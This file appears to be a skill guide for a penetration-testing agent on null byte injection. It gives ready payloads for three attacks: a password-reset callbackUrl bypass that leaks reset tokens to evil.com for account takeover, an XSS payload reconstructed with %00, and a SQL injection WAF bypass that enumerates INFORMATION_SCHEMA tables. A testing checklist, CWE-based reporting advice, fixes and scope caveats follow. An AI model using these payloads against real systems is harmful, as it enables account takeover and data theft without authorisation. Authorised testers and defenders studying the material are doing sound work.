---
name: null-byte-injection
description: Null byte injection (0x00 / %00 / JSON \u0000) used to bypass validators, WAFs, and parsing logic across URL, JSON body, and query-parameter contexts. Three proven uses: (1) password-reset callbackUrl parsing confusion — embed a JSON \u0000 after an attacker domain to bypass an @-whitelist that only allows company.net (evil.com\u0000@company.net parses to attacker-controlled), leaking the reset token to attacker; (2) path/LFI-to-XSS — when a whitelisted value is reflected but the `>` is truncated or the WAF strips it, append %00 after the > to reconstruct the payload and render XSS; (3) error-based/inband SQLi WAF bypass — insert %00 between SQL keywords (UNION %00 SELECT) so a signature-based WAF that hangs/blocks on malicious keywords misses it, enabling DB enumeration. Trigger: null byte, %00, \u0000, callbackUrl whitelist bypass, WAF bypass via null byte, path traversal to XSS, SQL injection WAF bypass.
---

# Null Byte Injection — bypass validators, WAFs, and parsing

A null byte (`0x00`) is a string terminator in C/backend semantics but often passes
through JSON/URL/HTTP layers. Because the **validator/parser** and the **runtime**
handle it differently, it can bypass domain whitelists, WAF signature checks, and
HTML/URL reconstruction. Three proven applications, plus how to encode it.

## Encoding a null byte per context
- **URL/query**: `%00`
- **JSON string body**: you can't send a raw control byte; use the JSON escape
  sequence `\u0000` (per RFC 8259, `\uXXXX`). Example: `"callbackUrl":"https://evil.com\u0000@company.net"`.
- **Raw HTTP**: actual `0x00` byte where a binary/raw parser is used.

## Use 1 — password-reset callbackUrl whitelist bypass (token poisoning)

App takes a `callbackUrl` for the reset email. You can control the path but a bare
attacker domain is rejected (400):
```
https://company.com/auth/reset-password/test?code=...   # path injection OK
http://evil.com@company.net/auth/reset-password          # 400 (domain block)
```
Bypass the `@`-based "must end with company.net" check with a null byte:
```
"callbackUrl": "https://evil.com\u0000@company.net/auth/reset-password"
```
The backend string ends at the null byte → the generated reset link points at
`evil.com`, leaking `?code=<token>` to the attacker. (Chain with the reset-token
poisoning impact — see host-header-password-poisoning for the same end goal.)

## Use 2 — whitelisted-template reflected value → XSS (WAF/trim bypass)

A `templatename` param only reflects a **whitelisted value** (else 500) and is
reflected into the response. To inject XSS within the allowed value:
- The `>` may be stripped or served oddly (WAF/HTML trim). Reconstruct it with a
  null byte after the `>` so the residual characters render:
  ```
  company/0xoldSaysHi">%00/../                     # quotes reflect, > fixed by %00
  company/0xoldSaysHi"%00><%00img+src=x+onerror=alert(1337)%00>/../   # XSS renders
  ```
- The `../` is allowed to pass through the whitelist, so the payload rides inside a
  traversal-looking value that the whitelist accepts.

## Use 3 — SQLi WAF bypass (signature-based)

An inband/error-based SQLi is blocked by an internal WAF that **hangs times out /
IP-blocks** on known keywords like `UNION SELECT`. Insert null bytes between the
keywords so the signature doesn't match, but MySQL still parses:
```
' UNION %00 SELECT 1337 --          (or /**/ comment variant)
' /**/ UNION %00 seLecT %00 TABLE_NAME,... FROM %00 INFORMATION_SCHEMA.tables WHERE table_schema='AdminDB' %23
```
`%00` between `UNION`/`SELECT`/keyword tokens defeats the WAF signature while MySQL
collapses/interprets it → DB name / table enumeration succeeds.

## Reusable checklist
1. **Find parsers/validators that reflect or URL-build from input**: callbackUrl /
   redirect / returnTo host checks, template/file-name include, SQL params.
2. **Test the null byte in the correct encoding** for the context:
   - JSON body → `\u0000`
   - URL/query → `%00`
   - raw → actual `0x00`
   Try it after: an attacker domain (whitelist bypass), after a truncated char
   (`>`), and between SQL keywords (WAF bypass).
3. **Prove impact**:
   - callbackUrl → the reset email link points at your host with `?code=` (use an
     owned test account).
   - template reflection → the XSS renders (alert).
   - SQLi → DB names / table names returned (stop short of dumping data).
4. Also try `%0a`, `%0d`, `\u000d\u000a`, tab `%09`, and CRLF variants — the WAF/
   validator may miss those too (see case-sensitivity/unicode skills).

## Reporting
- Classify per impact: password-reset token poisoning → **account takeover**
  (CWE-287 / CWE-601 / CWE-74); template-reflection XSS → **reflected/stored XSS**
  (CWE-79 / CWE-22); SQLi → **injection** (CWE-89). Null byte is the bypass primitive
  that crosses a WAF/validator boundary → note it as the root-cause bypass.
- Include the exact payload + the before/after (400 vs. success; 500 vs. 200+reflected
  XSS; hang/block vs. rows returned).
- Root cause: the validator/WAF and the runtime disagree on null-byte handling
  (C string terminator vs. JSON/URL layer). Fix: reject null/control bytes at input
  validation, use safe URL builders with an explicit origin whitelist, and parameterize
  SQL (no string-built queries); fix the WAF to decode/URL-decode before matching.

## Gotchas
- `\u0000` in JSON must be a valid escape for that parser; some backends reject or
  strip control chars — test which layer keeps it.
- Whitelisted-reflection XSS needs the allowed value to be reflected (discover the
  whitelist via a wordlist / CeWL from the site, then ffuf for a 200).
- SQLi: reproduce manually on your own session, keep it to enumeration (schema/names),
  don't dump large data; the WAF may IP-block after 3 malicious requests — pace it.
- Only use owned test accounts / your own requests.
